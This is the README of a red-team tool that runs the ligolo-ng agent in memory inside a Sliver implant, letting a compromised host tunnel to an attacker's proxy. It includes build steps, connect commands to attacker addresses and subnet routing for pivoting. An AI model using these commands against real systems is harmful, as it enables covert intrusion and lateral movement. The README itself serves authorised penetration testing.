# ligolo-bof

> A [Sliver](https://github.com/BishopFox/sliver) extension that runs the [ligolo-ng](https://github.com/nicocha30/ligolo-ng) agent as a shared library (DLL/SO), enabling in-memory, agentless tunnelling from a compromised host.

---

## Credits

This project is a **Sliver extension wrapper** around [ligolo-ng](https://github.com/nicocha30/ligolo-ng), an advanced tunnelling/pivoting tool created and maintained by **@nicocha30 (Nicolas Chatelain)**.

All core tunnelling logic, protocol design, and agent/handler implementations are the work of the original author. This project simply packages the agent as a loadable Sliver extension without requiring a second implant on disk.

- **Original Project**: https://github.com/nicocha30/ligolo-ng
- **Original Author**: [@nicocha30](https://github.com/nicocha30)
- **License**: GPLv3 (inherited from ligolo-ng)

---

## How It Works

```
[Sliver C2] ──➤ [ligolo-bof DLL] ──TLS──➤ [ligolo-ng proxy (attacker)]
                 (runs in-memory                 (./proxy -selfcert)
                  as Sliver extension)
```

The extension runs inside the Sliver implant's process. When invoked, it:
1. Dials the ligolo-ng proxy over TCP+TLS (or WebSocket/TLS).
2. Establishes a yamux-multiplexed session, matching the standard ligolo-ng agent protocol.
3. Handles all tunnelling commands from the proxy (connect, ping, listener, etc.).
4. Keeps running in the background, reconnecting automatically on failure.

TLS certificate verification is **disabled by default** — the proxy uses a self-signed certificate (`-selfcert`). Use `--accept-fingerprint` for certificate pinning.

---

## Requirements

### Attacker Machine (Linux)
- [ligolo-ng proxy](https://github.com/nicocha30/ligolo-ng/releases) — the listener side
- [Sliver C2](https://github.com/BishopFox/sliver) — to load and run the extension
- Go 1.21+ with CGO support
- MinGW cross-compilers (for Windows targets):
  ```bash
  sudo apt install gcc-mingw-w64-x86-64 gcc-mingw-w64-i686
  ```
- `jq` (for the setup script):
  ```bash
  sudo apt install jq
  ```

### Target Machine (Windows/Linux)
- An active Sliver implant session — no additional tools required.

---

## Installation

### 1. Clone the repository

```bash
git clone https://github.com/s4wbvnny/ligolo-bof.git
cd ligolo-bof
```

### 2. Build and install the Sliver extension

The setup script will compile all targets and install the extension automatically:

```bash
chmod +x setup_sliver_extension.sh
./setup_sliver_extension.sh
```

This will:
- Build `ligolo.x64.so` (Linux 64-bit)
- Build `ligolo.x64.dll` (Windows 64-bit)
- Build `ligolo.x86.dll` (Windows 32-bit)
- Copy everything to `~/.sliver-client/extensions/ligolo-ng-bof/`

### 3. Load the extension in Sliver

```
sliver > extensions load /home/<user>/.sliver-client/extensions/ligolo-ng-bof
```

---

## Usage

First, start the ligolo-ng proxy on your attacker machine:

```bash
./proxy -selfcert
```

Then, from inside a Sliver session on the target:

### Connect to the proxy

```
sliver (SESSION) > ligolo connect 192.168.1.100:11601
```

### Connect via WebSocket

```
sliver (SESSION) > ligolo connect wss://192.168.1.100:443
```

### Connect with certificate pinning

Get the fingerprint from the proxy output (`TLS Certificate fingerprint is: ...`), then:

```
sliver (SESSION) > ligolo connect 192.168.1.100:11601 --accept-fingerprint <SHA256_HEX>
```

### Connect via SOCKS5 proxy

```
sliver (SESSION) > ligolo connect 192.168.1.100:11601 --proxy socks5://127.0.0.1:1080
```

### List active tunnel tasks

```
sliver (SESSION) > ligolo list
```

### Stop a task

```
sliver (SESSION) > ligolo stop 0
```

---

## Setting Up the Tunnel (on the proxy)

Once the agent connects, use the standard ligolo-ng proxy workflow:

```
ligolo-ng » session
[Agent joined: WINBOX@WIN10 ...]
ligolo-ng » tunnel_start --tun ligolo
ligolo-ng » route add 192.168.50.0/24 ligolo
```

You can now route traffic through the tunnel just like any other ligolo-ng session.

---

## Building Manually

If you prefer to build targets individually:

```bash
# Linux x64
make linuxso_64

# Windows x64
make windowsdll_64

# Windows x86
make windowsdll_32

# All targets
make all windowsdll_64 windowsdll_32
```

---

## Project Structure

```
ligolo-bof/
├── main.go                    # Extension entrypoint + all connection logic
├── sendoutput_linux.go        # Output callback for Linux
├── sendoutput_windows.go      # Output callback for Windows
├── extension.json             # Sliver extension manifest
├── Makefile                   # Build system
├── setup_sliver_extension.sh  # One-shot build + install script
├── go.mod / go.sum            # Go module files
└── README.md
```

---

## Disclaimer

This tool is intended for **authorised penetration testing and red team engagements only**. Misuse of this software is illegal and unethical. The authors accept no liability for any damage caused by misuse of this tool.

---

## License

This project is licensed under the **GNU General Public License v3.0**, in accordance with the upstream [ligolo-ng](https://github.com/nicocha30/ligolo-ng) licence.
